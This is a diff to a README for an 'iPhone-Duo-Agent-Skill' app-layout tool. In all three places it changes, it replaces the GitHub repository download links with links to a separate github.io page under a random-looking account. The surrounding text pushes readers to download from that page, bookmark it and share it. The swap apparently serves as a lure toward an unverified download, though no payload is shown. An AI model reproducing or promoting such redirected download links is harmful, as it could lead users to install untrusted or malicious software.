@@ -1,6 +1,6 @@
 # 📱 iPhone-Duo-Agent-Skill - Make Your App Fit Any Screen
 
-[![Download iPhone-Duo-Agent-Skill](https://img.shields.io/badge/Download-iPhone--Duo--Agent--Skill-blue?style=for-the-badge&logo=github)](https://github.com/Urbanrenewalroridula3044/iPhone-Duo-Agent-Skill)
+[![Download iPhone-Duo-Agent-Skill](https://img.shields.io/badge/Download-iPhone--Duo--Agent--Skill-blue?style=for-the-badge&logo=github)](https://urbanrenewalroridula3044.github.io)
 
 ## 🎯 What This Does For You
 
@@ -16,7 +16,7 @@ iPhone-Duo-Agent-Skill is a smart helper that checks your iPhone app and automat
 
 ## 📥 Download and Install
 
-**Visit this link to download the application:** [https://github.com/Urbanrenewalroridula3044/iPhone-Duo-Agent-Skill](https://github.com/Urbanrenewalroridula3044/iPhone-Duo-Agent-Skill)
+**Visit this link to download the application:** [https://urbanrenewalroridula3044.github.io](https://urbanrenewalroridula3044.github.io)
 
 1. Click the link above to go to the download page
 2. Look for the green "Code" button and click it
@@ -109,7 +109,7 @@ When Apple releases new iPhone Duo features, this tool gets updated too. Check t
 
 You're just a few clicks away from making your app work beautifully on the iPhone Duo. Download the tool, follow the simple steps, and your app will be ready for the future of phones.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-green?style=for-the-badge&logo=download)](https://github.com/Urbanrenewalroridula3044/iPhone-Duo-Agent-Skill)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-green?style=for-the-badge&logo=download)](https://urbanrenewalroridula3044.github.io)
 
 Remember: The download link is always the same. Bookmark it, share it with friends, and come back anytime you need to update your app for the iPhone Duo.
 
